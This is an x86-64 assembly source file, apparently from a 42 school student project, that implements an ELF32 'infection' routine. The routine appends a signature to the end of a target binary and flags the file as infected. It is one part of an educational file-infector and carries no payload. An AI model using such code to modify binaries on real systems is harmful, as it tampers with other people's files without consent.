; **************************************************************************** ;
;                                                                              ;
;    infect32.asm                                         :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/15 08:21:18 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/15 08:21:18 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file
extern signature
extern sig_len

global infect_elf32

section .data

section .text

; =============================================================================
; infect_elf32: Infecte un binaire ELF32 avec la signature
; Params: aucun (utilise current_file)
; Returns: rax = 1 si succès, 0 si échec
; Side effects: modifie le fichier mappé
; =============================================================================
infect_elf32:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    
    ; Récupérer les infos du fichier
    mov r12, [current_file + file_info.mapped_addr]
    mov r13, [current_file + file_info.size]
    
    
    ; Vérifier qu'on a assez de place pour la signature
    mov rax, [sig_len]
    cmp r13, rax
    jl .error
    
    
    ; Méthode simple : append à la fin du fichier
    call infect_append_method_32
    
    
    ; Vérifier le succès (infect_append_method_32 retourne 1 si succès)
    cmp rax, 1
    jne .error
    
    ; Marquer comme infecté
    mov byte [current_file + file_info.is_infected], 1
    mov rax, 1
    jmp .done

.error:
    xor rax, rax

.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret

; =============================================================================
; infect_append_method_32: Méthode d'infection par append pour ELF32
; Params: r12 = mapped_addr, r13 = file_size
; Returns: rax = 1 si succès, 0 si échec
; Side effects: ajoute la signature à la fin du fichier
; =============================================================================
infect_append_method_32:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    
    mov rbx, r13                   ; Sauvegarder la taille actuelle
    
    ; Vérifier que la signature n'est pas vide
    mov rcx, [sig_len]
    test rcx, rcx
    jz .error_empty_sig
    
    ; Positionner le curseur en fin de fichier
    movsxd rdi, dword [current_file + file_info.fd]
    mov rsi, r13
    xor rdx, rdx                   ; SEEK_SET
    mov rax, SYS_LSEEK
    syscall
    cmp rax, 0
    jl .error
    
    
    ; Écrire la signature à la fin
    movsxd rdi, dword [current_file + file_info.fd]
    mov rsi, signature
    mov rcx, [sig_len]
    mov rdx, rcx
    mov rax, SYS_WRITE
    syscall
    cmp rax, 0
    jl .error
    
    mov rcx, [sig_len]
    cmp rax, rcx
    jne .error
    
    
    ; Mettre à jour la taille du fichier
    add rbx, rcx
    mov [current_file + file_info.size], rbx
    
    mov rax, 1
    jmp .done

.error:
    xor rax, rax
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

.error_empty_sig:
    xor rax, rax
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret
